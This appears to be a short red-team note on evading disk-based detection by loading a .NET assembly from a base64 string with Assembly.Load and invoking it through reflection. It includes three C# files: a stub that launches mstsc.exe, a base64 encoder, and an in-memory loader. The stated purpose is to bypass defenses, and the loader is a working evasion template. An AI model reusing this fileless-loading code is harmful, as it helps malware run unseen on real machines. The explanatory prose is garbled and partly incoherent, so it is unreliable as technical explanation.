# Assembly Load and  Reflection

**The Primary objective  of the System.Assembly. Methods Load() and LoadFrom() is  to load the assembly from the String in order to read the assembly from memory which  does not need to write into disk that may allow us to circumvent to evade.**

Technically The Assembly.Load() method to create an object that contains  the metadata of mstsc.exe as  about the assembly mstsc.exe.

The System.Reflection namespace is the process of runtime  to inspect metadata  In order to  execute the System.Assembly class


### Assembly.Load.cs
```
using System;
namespace MstscApplication

//C:\Users\NyaMeeEain\Desktop\Assembly.Load>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:mstsc.exe Assembly.Load.cs

{
	public class Program
	{
    		public static void Main()
    		{
        		Console.WriteLine("Main");
    		}
	}
	public class mstsc
	{
    		public static void Test()
    		{
        		System.Diagnostics.Process p = new System.Diagnostics.Process();
        		p.StartInfo.FileName = "c:\\windows\\system32\\mstsc.exe";
        		p.Start();
    		}
	}
}
```

### metadata.cs
```
using System;
using System.Reflection;
namespace MstscApplication
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:metadata.exe metadata.cs
{
    public class Program
    {
        public static void Main()
        {
//To obtain the metadata of mstsc.exe as base64 format
            byte[] metadata = System.IO.File.ReadAllBytes("mstsc.exe");
            string base64str = Convert.ToBase64String(metadata);
            Console.WriteLine(base64str);
        }
    }
}
```

### Execution.cs
```
using System;
using System.Reflection;
namespace MstscApplication
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:Execution Execution.cs
{
    public class Program
    {
        public static void Main()
        {
//C:\Users\NyaMeeEain\Desktop\Assembly.Load>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:testcalc.exe test.cs
            string base64str = "";
            byte[] buffer = Convert.FromBase64String(base64str);

            Assembly assembly = Assembly.Load(buffer);          
            Type type = assembly.GetType("MstscApplication.mstsc");
            MethodInfo method = type.GetMethod("Test");
            Object obj = assembly.CreateInstance(method.Name);            
            method.Invoke(obj, null);
        }
    }
}
```
